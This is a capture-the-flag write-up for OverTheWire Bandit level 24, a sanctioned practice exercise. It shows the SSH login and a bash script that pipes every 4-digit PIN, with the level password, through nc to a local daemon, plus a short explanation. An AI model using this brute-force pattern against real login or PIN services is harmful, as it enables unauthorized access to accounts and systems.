# Bandit Level 24 → Level 25
## Objective
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time.

---

## Server Details
- **Host:** bandit.labs.overthewire.org  
- **Port:** 2220  
- **Username:** bandit24

---

## SSH Command Used
```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220

## Commands Executed
vim /tmp/pass.sh

## Script
#!/bin/bash

PASS="********************************"

for pin in $(seq -w 0000 9999); do
  echo "$PASS $pin"
done | nc localhost 30002

## Commands Executed
chmod +x /tmp/pass.sh
/tmp/pass.sh

```
___

## Explanation

- To get password of next level all cases have to check so here a simple brute force script is written to log in.

- for loop is used to iterate over the numbers 0000 to 9999 for pin which is appended to password of current level. Along with it seq is used which iterates sequentially and -w is for taking leading 0's to maintain length of pin which is 4.

- Its output is piped to nc command which is used to connect to a daemon and 30002 port is used on localhost.

- This script will try all possible combinations until it hits the right one.
